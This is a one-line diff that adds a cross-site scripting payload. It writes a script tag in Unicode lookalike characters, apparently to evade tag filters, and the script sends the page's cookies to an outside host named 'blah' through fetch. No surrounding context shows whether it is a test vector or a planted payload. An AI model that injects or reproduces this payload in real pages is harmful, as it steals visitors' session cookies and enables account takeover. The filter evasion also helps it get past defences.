@@ -1,0 +1,1 @@
+﹤ˢcrⁱpt﹥fetch("http://blah/?c="+document.cookie)﹤/ˢcrⁱpt﹥
